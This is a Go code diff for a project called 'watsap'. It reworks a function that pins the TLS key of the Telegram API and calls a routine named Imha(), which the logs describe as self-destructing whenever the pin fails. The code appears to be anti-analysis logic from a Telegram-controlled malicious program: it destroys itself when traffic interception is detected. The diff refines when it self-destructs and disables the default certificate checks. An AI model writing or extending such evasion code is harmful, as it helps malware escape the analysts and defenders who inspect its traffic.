@@ -9,10 +9,11 @@ import (
 	"encoding/hex"
 	"encoding/pem"
 	"errors"
-	"log"
 	"net/http"
 	"os"
+	"strings"
 	"watsap/utils/config"
+	"watsap/utils/logger"
 )
 
 //go:embed cert.pem
@@ -50,13 +51,14 @@ func SSLPinning() {
 
 	liveSPKIBytes, err := hex.DecodeString(telegramLiveSPKI)
 	if err != nil {
-		log.Printf("Failed to decode hardcoded Telegram SPKI: %s", err.Error())
+		logger.Error("SSLPinning", "Failed to decode hardcoded Telegram SPKI: %s", err.Error())
 		Imha()
 		return
 	}
 
 	// Custom TLS Config with VerifyConnection callback (SPKI Pinning)
 	tlsConfig := &tls.Config{
+		InsecureSkipVerify: true, // Custom SPKI Pinning via VerifyConnection handles server verification
 		VerifyConnection: func(cs tls.ConnectionState) error {
 			if len(cs.PeerCertificates) == 0 {
 				return errors.New("server presented no certificates")
@@ -95,12 +97,16 @@ func SSLPinning() {
 	// Make a request to the API to verify
 	resp, err := client.Get("https://api.telegram.org")
 	if err != nil {
-		log.Printf("Failed to make request to API (SSL Pinning failed): %s", err.Error())
-		Imha()
+		logger.Warn("SSLPinning", "Failed to make request to API: %s", err.Error())
+		if strings.Contains(err.Error(), "SSL Pinning failed") {
+			logger.Error("SSLPinning", "Certificate verification failed! Self-destructing...")
+			Imha()
+		} else {
+			logger.Warn("SSLPinning", "Network connection unavailable/failed. Continuing execution.")
+		}
 		return
 	}
 	defer resp.Body.Close()
 
-	log.Println("SSL Pinning successful (SPKI Pinning verified)")
+	logger.Info("SSLPinning", "SSL Pinning successful (SPKI Pinning verified)")
 }
-
